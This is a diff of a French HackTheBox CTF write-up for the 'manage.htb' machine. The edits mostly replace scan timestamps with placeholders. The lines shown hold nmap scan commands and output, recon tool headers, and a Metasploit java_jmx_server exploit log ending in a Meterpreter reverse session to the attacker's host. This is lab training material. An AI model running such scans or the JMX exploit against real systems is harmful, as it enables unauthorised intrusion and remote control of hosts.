@@ -89,10 +89,9 @@ Tu vas obtenir un **premier accès** via JMX, récupérer un backup contenant un
 
 Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) révèle les ports ouverts suivants :
 
-> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée (Tomcat + RMI/JMX).
 
 ```txt
-# Nmap 7.98 scan initiated Sun Jan 11 15:26:48 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt manage.htb
+# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt manage.htb
 Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0086s latency).
 Not shown: 65530 closed tcp ports (reset)
@@ -103,7 +102,7 @@ PORT      STATE SERVICE
 37055/tcp open  unknown
 45353/tcp open  unknown
 
-# Nmap done at Sun Jan 11 15:26:58 2026 -- 1 IP address (1 host up) scanned in 10.95 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 10.95 seconds
 
 ```
 
@@ -118,7 +117,7 @@ Résultat (`scans_nmap/aggressive_vuln_scan.txt`) :
 [+] Commande utilisée :
     nmap -Pn -A -sV -p"22,2222,8080,37055,45353" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "manage.htb"
 
-# Nmap 7.98 scan initiated Sun Jan 11 15:26:59 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,2222,8080,37055,45353 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan.txt manage.htb
+# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,2222,8080,37055,45353 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan.txt manage.htb
 Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0089s latency).
 
@@ -142,7 +141,7 @@ HOP RTT     ADDRESS
 2   8.33 ms manage.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sun Jan 11 15:27:13 2026 -- 1 IP address (1 host up) scanned in 14.58 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 14.58 seconds
 
 ```
 
@@ -151,7 +150,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
 
 ```txt
-# Nmap 7.98 scan initiated Sun Jan 11 15:27:13 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,2222,8080,37055,45353 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt manage.htb
+# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,2222,8080,37055,45353 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt manage.htb
 Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0081s latency).
 
@@ -184,7 +183,7 @@ PORT      STATE SERVICE    VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sun Jan 11 15:27:48 2026 -- 1 IP address (1 host up) scanned in 34.65 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 34.65 seconds
 
 ```
 
@@ -195,7 +194,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
 
 ```txt
-# Nmap 7.95 scan initiated Wed Nov 19 15:55:59 2025 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt manage.htb
+# Nmap 7.95 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt manage.htb
 Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0086s latency).
 
@@ -221,7 +220,7 @@ PORT      STATE         SERVICE
 4500/udp  closed        nat-t-ike
 49152/udp open|filtered unknown
 
-# Nmap done at Wed Nov 19 15:56:08 2025 -- 1 IP address (1 host up) scanned in 9.76 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 9.76 seconds
 
 ```
 
@@ -257,7 +256,7 @@ Script              : mon-recoweb v2.1.0
 
 Cible        : manage.htb:8080
 Périmètre    : /
-Date début   : 2026-01-11 15:40:00
+Date début   : [date] 15:40:00
 
 Commandes exécutées (exactes) :
 
@@ -331,7 +330,7 @@ mon-subdomains manage.htb
 === mon-subdomains manage.htb START ===
 Script       : mon-subdomains
 Version      : mon-subdomains 2.0.0
-Date         : 2026-01-11 15:45:45
+Date         : [date] 15:45:45
 Domaine      : manage.htb
 IP           : 10.129.x.x
 Mode         : large
@@ -546,7 +545,7 @@ msf exploit(multi/misc/java_jmx_server) > exploit
 [*] 10.129.x.x:2222 - Replied to request for payload JAR
 [*] 10.129.x.x:2222 - Replied to request for payload JAR
 [*] Sending stage (58073 bytes) to 10.129.x.x
-[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.x.x:59886) at 2025-11-20 10:19:57 +0100
+[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.x.x:59886) at [date] 10:19:57 +0100
 [*] 10.129.x.x:2222 - Server stopped.
 
 meterpreter >
